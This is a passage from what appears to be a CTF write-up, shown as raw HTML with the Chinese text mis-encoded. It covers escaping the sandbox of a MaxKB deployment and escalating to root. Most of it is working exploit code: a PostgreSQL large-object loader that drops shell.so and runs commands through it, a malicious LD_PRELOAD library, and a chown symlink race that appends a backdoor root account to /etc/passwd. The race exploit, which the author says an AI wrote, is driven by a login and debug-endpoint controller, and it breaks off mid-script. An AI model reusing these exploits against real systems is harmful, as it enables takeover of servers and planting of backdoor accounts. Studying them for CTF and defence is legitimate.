class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#~/usr/bin/env python 2.7</span><span class="token comment">#-*- coding:utf-8 -*-</span><span class="token keyword">import</span> sys<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Usage:python "</span> <span class="token operator">+</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"inputfile"</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    fileobj <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span>    i <span class="token operator">=</span> <span class="token number">0</span>    j <span class="token operator">=</span> <span class="token number">1</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"SELECT lo_create(9023);insert into pg_largeobject values (9023, 0, decode('"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> b <span class="token keyword">in</span> fileobj<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">r'&#123;:02x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">2048</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"','hex'));insert into pg_largeobject values (9023,"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">", decode('"</span><span class="token punctuation">)</span>            j <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">1</span>    fileobj<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"','hex'));SELECT lo_export(9023, 'shell.so');"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰“å…¥ä¸Šé¢çš„ payload åè½½å…¥ so</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> sys_eva<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token keyword">RETURNS</span> <span class="token keyword">text</span> <span class="token keyword">AS</span> <span class="token string">'/opt/maxkb/data/postgresql/pgdata/shell.so'</span><span class="token punctuation">,</span> <span class="token string">'sys_eva'</span> <span class="token keyword">LANGUAGE</span> C STRICT<span class="token punctuation">;</span><span class="token keyword">select</span> sys_eva<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>äºæ˜¯å®ç°æ²™ç›’é€ƒé€¸</p><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20251116152721461.png"></p><p>ä½†æ˜¯è¿˜å¾—æåˆ° rootï¼Œæ²¡æ‹›äº†</p><hr><h2 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>è€ƒè™‘åˆ°åé¢æ”¾å‡ºäº† RootKBâ€“ åè€Œè§£çš„æ›´å°‘ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯åœ¨ 2.3.1 åŠ çš„æ–°ä¸œè¥¿å‘åŠ›äº†ï¼Œè§‚å¯Ÿ commit å˜åŒ–</p><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20251118003626253.png"></p><p>ä» docker é‡ŒæŸ¥çœ‹è¿›ç¨‹æˆ‘ä»¬å¯ä»¥å‘ç°è¿™ä¸ªæœåŠ¡æ˜¯ç”¨ root æƒé™èµ·çš„ï¼Œå¦‚æœæˆ‘ä»¬èƒ½åŠ«æŒè¿™é‡Œçš„ LD_PRELOAD å°±èƒ½æ‹¿ä¸‹ï¼ŒæŸ¥çœ‹æƒé™ï¼ˆå”‰åŸºç¡€ä¸æ‰å®ä»¥ä¸º sandbox è¿™é‡Œæ˜¯ rx æƒé™ï¼‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-rwxr-xr-x <span class="token number">1</span> sandbox root  70K Nov <span class="token number">13</span> <span class="token number">11</span>:19 sandbox.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sandbox æœ‰ rwx æƒé™ï¼Œé‚£å°±æ˜¯å¯å†™ï¼Œé‚£ç›´æ¥å†™æ¶æ„ so å°±å®Œäº‹äº†</p><p>sandbox.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">abc</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>src <span class="token operator">=</span> <span class="token string">"/root/flag"</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>dst <span class="token operator">=</span> <span class="token string">"/opt/maxkb-app/apps/static/admin/assets/flag"</span><span class="token punctuation">;</span><span class="token function">rename</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>b64 å†™è¿›å»å³å¯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/opt/maxkb-app/sandbox/sandbox.so"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"success"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åè®¿é—®é™æ€ç›®å½•è¯»å–</p><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20251119151944990.png"></p><hr><h1 id="RootKBâ€“ï¼ˆå¤ç°ï¼‰"><a href="#RootKBâ€“ï¼ˆå¤ç°ï¼‰" class="headerlink" title="RootKBâ€“ï¼ˆå¤ç°ï¼‰"></a>RootKBâ€“ï¼ˆå¤ç°ï¼‰</h1><p>ç‰ˆæœ¬é™åˆ°äº† 2.3.0ï¼Œæ²¡æœ‰ LD_PRELOAD äº†</p><h2 id="è§£æ³•ä¸€ï¼šæ¡ä»¶ç«äº‰-chown"><a href="#è§£æ³•ä¸€ï¼šæ¡ä»¶ç«äº‰-chown" class="headerlink" title="è§£æ³•ä¸€ï¼šæ¡ä»¶ç«äº‰ chown"></a>è§£æ³•ä¸€ï¼šæ¡ä»¶ç«äº‰ chown</h2><p>å°è¯•å†™ä¸€ä¸ª sleep å»¶è¿Ÿåˆ é™¤åœ¨ docker é‡Œçœ‹çœ‹ execute ç›®å½•ä¸‹æ²™ç›’æ‰§è¡Œçš„è„šæœ¬å†…å®¹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">import</span> os    <span class="token keyword">import</span> sys    <span class="token keyword">import</span> json    path_to_exclude <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'/opt/py3/lib/python3.11/site-packages'</span><span class="token punctuation">,</span> <span class="token string">'/opt/maxkb-app/apps'</span><span class="token punctuation">]</span>    sys<span class="token punctuation">.</span>path <span class="token operator">=</span> <span class="token punctuation">[</span>p <span class="token keyword">for</span> p <span class="token keyword">in</span> sys<span class="token punctuation">.</span>path <span class="token keyword">if</span> p <span class="token keyword">not</span> <span class="token keyword">in</span> path_to_exclude<span class="token punctuation">]</span>    sys<span class="token punctuation">.</span>path <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'/opt/py3/lib/python3.11/site-packages'</span><span class="token punctuation">,</span> <span class="token string">'/opt/maxkb-app/sandbox/python-packages'</span><span class="token punctuation">,</span> <span class="token string">'/opt/maxkb/python-packages'</span><span class="token punctuation">]</span>    locals_v<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    keywords<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    globals_v<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">'import time\ndef a():\n    return time.sleep(20)'</span><span class="token punctuation">,</span> globals_v<span class="token punctuation">,</span> locals_v<span class="token punctuation">)</span>    f_name<span class="token punctuation">,</span> f <span class="token operator">=</span> locals_v<span class="token punctuation">.</span>popitem<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> local <span class="token keyword">in</span> locals_v<span class="token punctuation">:</span>        globals_v<span class="token punctuation">[</span>local<span class="token punctuation">]</span> <span class="token operator">=</span> locals_v<span class="token punctuation">[</span>local<span class="token punctuation">]</span>    exec_result<span class="token operator">=</span>f<span class="token punctuation">(</span><span class="token operator">**</span>keywords<span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/opt/maxkb-app/sandbox/result/019a9ba8-e320-7b83-92c4-8787494f094f.result'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">"æˆåŠŸ"</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token punctuation">:</span>exec_result<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/opt/maxkb-app/sandbox/result/019a9ba8-e320-7b83-92c4-8787494f094f.result'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token punctuation">:</span><span class="token boolean">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ 2.3.0 çš„æºç ä¸­</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">_exec_sandbox</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> _code<span class="token punctuation">,</span> _id<span class="token punctuation">)</span><span class="token punctuation">:</span>    exec_python_file <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>sandbox_path<span class="token punctuation">&#125;</span></span><span class="token string">/execute/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_id<span class="token punctuation">&#125;</span></span><span class="token string">.py'</span></span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>exec_python_file<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>_code<span class="token punctuation">)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"chown </span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>user<span class="token punctuation">&#125;</span></span><span class="token string">:root </span><span class="token interpolation"><span class="token punctuation">&#123;</span>exec_python_file<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    kwargs <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'cwd'</span><span class="token punctuation">:</span> BASE_DIR<span class="token punctuation">&#125;</span>    subprocess_result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>        <span class="token punctuation">[</span><span class="token string">'su'</span><span class="token punctuation">,</span> <span class="token string">'-s'</span><span class="token punctuation">,</span> python_directory<span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">"exec(open('"</span> <span class="token operator">+</span> exec_python_file <span class="token operator">+</span> <span class="token string">"').read())"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>user<span class="token punctuation">]</span><span class="token punctuation">,</span>        text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>        capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>exec_python_file<span class="token punctuation">)</span>    <span class="token keyword">return</span> subprocess_result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å­˜åœ¨å¯¹å†™å…¥çš„ py æ–‡ä»¶è¿›è¡Œ chown çš„æ“ä½œï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œ<code>chown</code> é»˜è®¤ä¼šè·Ÿéš symlink å¹¶ä¿®æ”¹å…¶ç›®æ ‡æ–‡ä»¶ï¼Œè¿™ä¸€ç‚¹å¯ä»¥æƒ³åˆ° <a href="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/#php-online%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89">2024 å¹´å·…å³°æå®¢çš„ php_online</a></p><p>å¦‚æœæˆ‘ä»¬èƒ½è®©è¿™é‡Œçš„ exec_python_file ä¸ºä¸€ä¸ª symlinkï¼Œå°±å¯ä»¥ä½¿ç”¨ chown æ“çºµç³»ç»Ÿä¸­ä»»æ„æ–‡ä»¶çš„æ‰€æœ‰æƒ</p><p>é‚£ä¹ˆè¿™é‡Œæœ€å¤§çš„é—®é¢˜å°±æ˜¯å¦‚ä½•å¾—çŸ¥ _id çš„å€¼ï¼Œè¿™é‡Œæ˜¯ <code>_id = str(uuid.uuid7())</code></p><p>â€¦</p><p>ai å¤ªå¯æ€•äº†ï¼Œç›´æ¥æŠŠ exp åå‡ºæ¥äº†ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threading<span class="token keyword">import</span> time<span class="token keyword">import</span> sys<span class="token keyword">import</span> json<span class="token comment"># ================= é…ç½®åŒºåŸŸ =================</span><span class="token comment"># MaxKB ç›®æ ‡åœ°å€</span>TARGET_URL <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:28080"</span><span class="token comment"># éœ€è¦ä¸€ä¸ªå…·æœ‰ã€Œåº”ç”¨è°ƒè¯•ã€æˆ–ã€Œå·¥å…·æµ‹è¯•ã€æƒé™çš„è´¦å·</span>USERNAME <span class="token operator">=</span> <span class="token string">"admin"</span>PASSWORD <span class="token operator">=</span> <span class="token string">"MaxKB@123456"</span><span class="token comment"># ================= æ¶æ„ Payload (æ³¨å…¥åˆ° MaxKB å†…éƒ¨è¿è¡Œ) =================</span><span class="token comment"># æ³¨æ„ï¼šæ ¹æ®æºç ï¼Œsandbox è·¯å¾„é»˜è®¤ä¸º /opt/maxkb-app/sandbox</span><span class="token comment"># æ‰§è¡Œç›®å½•ä¸º /opt/maxkb-app/sandbox/execute</span>INTERNAL_RACER_CODE <span class="token operator">=</span> <span class="token triple-quoted-string string">r"""import osimport timeimport threadingimport glob# æ”»å‡»ç›®æ ‡ï¼šç³»ç»Ÿå¯†ç æ–‡ä»¶TARGET_FILE = '/etc/passwd'# ç›‘å¬ç›®å½•ï¼šæºç ä¸­ç¡¬ç¼–ç çš„è·¯å¾„SANDBOX_EXEC_DIR = '/opt/maxkb-app/sandbox/execute'# ææƒåå†™å…¥çš„åé—¨ç”¨æˆ· (user: toor, pass: root)BACKDOOR_ENTRY = 'toor:$1$u1UR7D3z$Zp7IvFndtV5XH/tYozXi6.:0:0:root:/root:/bin/bash\n'def racer():    print(f"[Internal] Monitoring &#123;SANDBOX_EXEC_DIR&#125; for race condition...")    while True:        try:            # æé€Ÿæ‰«æç›®å½•ä¸‹çš„ .py æ–‡ä»¶            # æºç ä½¿ç”¨ uuid.uuid7() ç”Ÿæˆæ–‡ä»¶åï¼Œæ— æ³•é¢„æµ‹ï¼Œåªèƒ½æ ¹æ®æ‰©å±•åæ‰«æ            files = [f for f in os.listdir(SANDBOX_EXEC_DIR) if f.endswith('.py')]                        for filename in files:                filepath = os.path.join(SANDBOX_EXEC_DIR, filename)                                # æ’é™¤è½¯é“¾æ¥æœ¬èº«ï¼Œé˜²æ­¢æ­»å¾ªç¯                if not os.path.islink(filepath):                    try:                        # === ç«äº‰æ ¸å¿ƒ ===                        # 1. å‘ç°æ–°ç”Ÿæˆçš„ py æ–‡ä»¶                        # 2. ç¬é—´åˆ é™¤                        os.remove(filepath)                        # 3. å»ºç«‹æŒ‡å‘ /etc/passwd çš„è½¯é“¾æ¥                        os.symlink(TARGET_FILE, filepath)                        print(f"[Internal] Swapped &#123;filename&#125; -> &#123;TARGET_FILE&#125;")                    except OSError:                        # æ–‡ä»¶å¯èƒ½å·²ç»è¢«ä¸»è¿›ç¨‹é”ä½æˆ–åˆ é™¤ï¼Œå¿½ç•¥é”™è¯¯ç»§ç»­å°è¯•                        pass        except Exception as e:            passdef privilege_escalation():    print("[Internal] Watching /etc/passwd permissions...")    start_t = time.time()    # ç›‘æ§ 30 ç§’    while time.time() - start_t &lt; 30:        try:            # æ£€æŸ¥æ˜¯å¦è·å¾—äº†å†™æƒé™            if os.access(TARGET_FILE, os.W_OK):                print("[Internal] SUCCESS! /etc/passwd is writable!")                                # å†™å…¥åé—¨                with open(TARGET_FILE, 'r') as f:                    content = f.read()                                if "toor" not in content:                    with open(TARGET_FILE, 'a') as f:                        f.write(BACKDOOR_ENTRY)                    print("[Internal] Backdoor user 'toor' injected.")                                # éªŒè¯ root æƒé™                print("[Internal] Root access confirmed.")                return        except:            pass        time.sleep(0.1)def main():    # å¯åŠ¨ç«äº‰çº¿ç¨‹    t = threading.Thread(target=racer)    t.daemon = True    t.start()    # å¯åŠ¨ææƒç›‘æ§    privilege_escalation()    return "test""""</span><span class="token comment"># ================= æ§åˆ¶å™¨ (è¿è¡Œåœ¨æ”»å‡»è€…æœ¬åœ°) =================</span><span class="token keyword">class</span> <span class="token class-name">MaxKBExploit</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">,</span> user<span class="token punctuation">,</span> pwd<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>url <span class="token operator">=</span> url<span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>username <span class="token operator">=</span> user        self<span class="token punctuation">.</span>password <span class="token operator">=</span> pwd        self<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] Logging in as </span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>username<span class="token punctuation">&#125;</span></span><span class="token string">..."</span></span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>url<span class="token punctuation">&#125;</span></span><span class="token string">/admin/api/user/login"</span></span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">&#123;</span>                <span class="token string">"username"</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>username<span class="token punctuation">,</span> <span class="token string">"encryptedData"</span><span class="token punctuation">:</span> <span class="token string">"ftKwsap5K0YkhVj5uELjL3AUkPTU19rG3AyI9S16coqMQuc5f1dPj3oCDuAYhR4VRPzcL0hFF40DLTw/tAXfyvmf/0GEsYLkCtz0E5waThE6fooF5zC2vlGliEqVnrv991QULxtIiNLY7xKlg+R4rUa5u4Z1NNDC0/hUvNRO+i9fGjtCM2Xpc6VgQzwBB4h0G4nb1snRQCAPzu/4DKAx0yU7Bbg9dbZVxXsVssnxipneZ4hj1jiE8HTn/7ZUEu2kj6QvzMe2AltP6gwF4e0YZcNEMeF7ig2uwFee4p6aWQBs3CZ1+YFATRwXksxYmvCqz68sJLcnKmraXS3v85BflA=="</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> <span class="token string">"data"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                token <span class="token operator">=</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span>                self<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Authorization"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"Bearer </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Login successful."</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Login failed: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">trigger_debug</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> code<span class="token punctuation">,</span> wait<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        åˆ©ç”¨ MaxKB çš„å·¥å…·è°ƒè¯•æ¥å£æ‰§è¡Œ Python ä»£ç ã€‚        æ ¹æ®æºç ï¼Œè¿™é‡Œè§¦å‘ ToolExecutor.exec_code        """</span>        <span class="token comment"># å®æˆ˜ä¸­ endpoint å¯èƒ½ä¸åŒï¼Œé€šå¸¸æ˜¯ /api/application/&#123;id&#125;/chat æˆ– /api/tool/debug</span>        <span class="token comment"># è¿™é‡Œå‡è®¾ç›´æ¥è°ƒç”¨å·¥å…·å•å…ƒæµ‹è¯•æ¥å£</span>        endpoint <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>url<span class="token punctuation">&#125;</span></span><span class="token string">/admin/api/workspace/default/tool/debug"</span></span> <span class="token comment"># éœ€è¦æ ¹æ®å®é™…æŠ“åŒ…è°ƒæ•´</span>                payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"code"</span><span class="token punctuation">:</span> code<span class="token punctuation">,</span>            <span class="token string">"debug_field_list"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">"input_field_list"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">"init_field_list"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">"init_params"</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> wait<span class="token punctuation">:</span>                <span class="token comment"># è¿™é‡Œçš„ timeout è®¾ç½®è¾ƒé•¿ï¼Œç­‰å¾… Racer è·‘å®Œ</span>                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>endpoint<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">,</span> headers<span class="token operator">=</span>self<span class="token punctuation">.</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token 